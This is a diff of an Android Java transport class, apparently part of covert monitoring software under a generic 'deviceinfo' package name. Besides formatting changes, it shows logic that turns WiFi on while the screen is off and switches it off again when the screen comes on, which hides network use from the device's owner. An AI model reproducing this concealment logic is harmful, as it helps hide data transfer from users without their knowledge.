@@ -28,7 +28,7 @@ import com.android.deviceinfo.util.Utils;
 /**
  * The Class WifiTransport.
  */
-public class WifiTransport extends HttpKeepAliveTransport implements Observer<Standby>{
+public class WifiTransport extends HttpKeepAliveTransport implements Observer<Standby> {
 	private static final String TAG = "WifiTransport"; //$NON-NLS-1$
 	/** The forced. */
 	private boolean forced;
@@ -75,10 +75,12 @@ public class WifiTransport extends HttpKeepAliveTransport implements Observer<St
 			return true;
 		}
 
-		//NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
-		//boolean available = mWifi.isAvailable() && /*mWifi.isConnected()*/ mWifi.isConnectedOrConnecting();
+		// NetworkInfo mWifi =
+		// connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
+		// boolean available = mWifi.isAvailable() && /*mWifi.isConnected()*/
+		// mWifi.isConnectedOrConnecting();
 		boolean available = Status.wifiConnected;
-		
+
 		if (available) {
 			connManager.setNetworkPreference(ConnectivityManager.TYPE_WIFI);
 		}
@@ -96,14 +98,15 @@ public class WifiTransport extends HttpKeepAliveTransport implements Observer<St
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (enable): wifi connectivity won't be forced, force flag is disabled"); //$NON-NLS-1$
 			}
-			
+
 			return;
 		}
-		
+
 		// wifi.reconnect();
 		// wifi.reassociate();
 		// ConnectivityManager.setNetworkPrefrence(ConnectivityManager.TYPE_WIFI)
-		if (wifi.getWifiState() == WifiManager.WIFI_STATE_ENABLED || wifi.getWifiState() == WifiManager.WIFI_STATE_ENABLING) {
+		if (wifi.getWifiState() == WifiManager.WIFI_STATE_ENABLED
+				|| wifi.getWifiState() == WifiManager.WIFI_STATE_ENABLING) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (enable): wifi already on, forcing not required"); //$NON-NLS-1$
 			}
@@ -121,25 +124,27 @@ public class WifiTransport extends HttpKeepAliveTransport implements Observer<St
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (enable): cannot enable WiFi interface"); //$NON-NLS-1$
 			}
-		}else{
+		} else {
 			for (int i = 0; i < 30; i++) {
 				if (isAvailable()) {
 					break;
 				}
-	
+
 				Utils.sleep(1000);
 			}
-			
-			if(switchedOn && !ListenerStandby.self().isScreenOn()){
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (enable) ListenerStandby start");
+
+			if (Cfg.ENABLE_WIFI_DISABLE) {
+				if (switchedOn && !ListenerStandby.self().isScreenOn()) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (enable) ListenerStandby start");
+					}
+					ListenerStandby.self().attach(this);
 				}
-				ListenerStandby.self().attach(this);
 			}
 		}
-		
+
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (enable) finished " +isAvailable());
+			Check.log(TAG + " (enable) finished " + isAvailable());
 		}
 	}
 
@@ -151,23 +156,27 @@ public class WifiTransport extends HttpKeepAliveTransport implements Observer<St
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (close) detach Standby");
 			}
-			ListenerStandby.self().detach(this);
+			if (Cfg.ENABLE_WIFI_DISABLE) {
+				ListenerStandby.self().detach(this);
+			}
 			wifi.setWifiEnabled(false);
 			switchedOn = false;
 		}
 	}
 
-
 	@Override
 	public int notification(Standby b) {
-		if(b.isScreenOn() && switchedOn){
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification) Switching off because screen is on");
+		if (Cfg.ENABLE_WIFI_DISABLE) {
+			if (b.isScreenOn() && switchedOn) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (notification) Switching off because screen is on");
+				}
+				ListenerStandby.self().detach(this);
+				wifi.setWifiEnabled(false);
+				switchedOn = false;
 			}
-			ListenerStandby.self().detach(this);
-			wifi.setWifiEnabled(false);
-			switchedOn = false;
 		}
 		return 0;
+
 	}
 }
